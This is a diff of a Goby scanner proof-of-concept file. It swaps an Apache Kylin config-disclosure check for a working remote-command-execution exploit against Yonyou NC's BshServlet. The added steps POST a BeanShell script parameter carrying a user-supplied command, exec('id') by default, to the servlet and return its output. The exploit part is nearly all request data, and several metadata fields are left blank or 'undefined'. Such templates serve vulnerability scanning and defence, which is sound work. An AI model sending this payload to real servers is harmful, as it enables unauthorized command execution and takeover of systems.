@@ -1,25 +1,25 @@
 {
-      "Name": "Apache Kylin Unauthorized configuration disclosure (CVE-2020-13937)",
-      "Level": "0",
+      "Name": "用友 NC bsh.servlet.BshServlet 远程命令执行漏洞",
+      "Level": "3",
       "Tags": [
-            "Disclosure of Sensitive Information"
+            "RCE"
       ],
-      "GobyQuery": "app=\"APACHE-kylin\"",
-      "Description": "Apache kylin has a restful API that exposes configuration information without authorization.\nAttackers can use this vulnerability to obtain sensitive information of the system.",
-      "Product": "Apache kylin",
-      "Homepage": "http://kylin.apache.org/",
-      "Author": "PeiQi",
-      "Impact": "<p>Attackers can use this vulnerability to obtain sensitive information of the system.<br></p>",
-      "Recommandation": "<p>Upgrade to the safe version, or perform the following mitigation measures:</p><p>Edit \"$kylin\"_ HOME/WEB-INF/classes/ kylinSecurity.xml \"；</p><p>Delete the following line \"&lt; scr:intercept-url pattern= \"/api/admin/config\" access=\"permitAll\"/&gt;\"；</p><p>Restart the kylin instance to take effect.</p>",
+      "GobyQuery": "body=\"Script\"",
+      "Description": "用友 NC bsh.servlet.BshServlet 存在远程命令执行漏洞，通过BeanShell 执行远程命令获取服务器权限",
+      "Product": "",
+      "Homepage": "https://gobies.org/",
+      "Author": "gobysec@gmail.com",
+      "Impact": "",
+      "Recommandation": "<p>undefined</p>",
       "References": [
-            "http://wiki.peiqi.tech"
+            "https://mp.weixin.qq.com/s/FvqC1I_G14AEQNztU0zn8A"
       ],
 	  "HasExp": true,
 	  "ExpParams": [
 		{
-			"name": "Config",
-			"type": "select",
-			"value": "/kylin/api/admin/config",
+			"name": "Cmd",
+			"type": "input",
+			"value": "exec('id')",
 			"show": ""
 		}
 	  ],
@@ -28,15 +28,15 @@
             {
                   "Request": {
                         "method": "GET",
-                        "uri": "/kylin/api/admin/config",
-                        "follow_redirect": true,
+                        "uri": "/servlet/~ic/bsh.servlet.BshServlet",
+                        "follow_redirect": false,
                         "header": {},
                         "data_type": "text",
                         "data": ""
                   },
                   "ResponseTest": {
                         "type": "group",
-                        "operation": "AND",
+                        "operation": "OR",
                         "checks": [
                               {
                                     "type": "item",
@@ -49,7 +49,7 @@
                                     "type": "item",
                                     "variable": "$body",
                                     "operation": "contains",
-                                    "value": "config",
+                                    "value": "Script",
                                     "bz": ""
                               }
                         ]
@@ -61,16 +61,19 @@
             "AND",
             {
                   "Request": {
-                        "method": "GET",
-                        "uri": "/kylin/api/admin/config",
+                        "method": "POST",
+                        "uri": "/servlet/~ic/bsh.servlet.BshServlet",
                         "follow_redirect": true,
-                        "header": {},
+                        "header": {
+                              "Content-Type": "application/x-www-form-urlencoded",
+                              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
+                        },
                         "data_type": "text",
-                        "data": ""
+                        "data": "bsh.script={{{Cmd}}}"
                   },
-				  "ResponseTest": {
+                  "ResponseTest": {
                         "type": "group",
-                        "operation": "AND",
+                        "operation": "OR",
                         "checks": [
                               {
                                     "type": "item",
@@ -83,7 +86,7 @@
                                     "type": "item",
                                     "variable": "$body",
                                     "operation": "contains",
-                                    "value": "config",
+                                    "value": "Administrator",
                                     "bz": ""
                               }
                         ]
@@ -92,7 +95,7 @@
 					"output|lastbody"
 				  ]
             }
-      ],
-      "PostTime": "2021-04-04 15:55:28",
-      "GobyVersion": "1.8.255"
+		],
+      "PostTime": "2021-06-01 18:26:13",
+      "GobyVersion": "1.8.268"
 }
